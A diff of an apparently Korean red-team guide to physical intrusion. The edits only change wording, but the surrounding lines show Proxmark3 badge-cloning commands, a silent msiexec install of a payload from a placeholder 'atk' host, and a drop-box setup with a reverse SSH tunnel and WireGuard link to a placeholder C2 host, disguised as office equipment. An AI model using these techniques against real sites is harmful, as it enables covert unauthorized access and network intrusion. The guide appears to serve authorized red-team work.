@@ -29,7 +29,7 @@ pm3> lf hid sim -r 2006ec0c86           # 읽은 값으로 emulate
 pm3> lf hid clone -r 2006ec0c86         # 공카드에 복제
 
 # MIFARE Classic (13.56MHz)
-pm3> hf mf autopwn                      # 기본 키 자동 덤프
+pm3> hf mf autopwn                      # 기본 키 자동 dump
 ```
 
 - **ESPKey**: 출입통제기 Wiegand 라인 (D0 / D1) 에 인라인으로 끼워 두면 지나가는 모든 카드 값이 수집된다.
@@ -105,7 +105,7 @@ msiexec /q /i http://atk/payload.msi
 
 ```bash
 # Raspberry Pi 4 + LTE 모뎀
-# 1. reverse SSH 터널
+# 1. reverse SSH tunnel
 autossh -f -N -R 2222:localhost:22 redteam@c2.example.com
 
 # 2. Wireguard (안정적)
@@ -118,10 +118,10 @@ Endpoint = c2.example.com:51820
 AllowedIPs = 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
 PersistentKeepalive = 25
 
-# 3. 이후 내부망 정찰은 C2 쪽에서 터널로 다 진행
+# 3. 이후 내부망 정찰은 C2 쪽에서 tunnel 로 다 진행
 ```
 
-- 발각 대비: 외관은 평범한 HDMI 캡처 장비 / 회의실 콘솔 / 전원 스트립 으로 위장.
+- 발각 대비: 외관은 평범한 HDMI capture 장비 / 회의실 콘솔 / 전원 스트립 으로 위장.
 - 전원 뽑혀도 자동 재접속: `autossh` + `systemd Restart=always`.
 
 ---
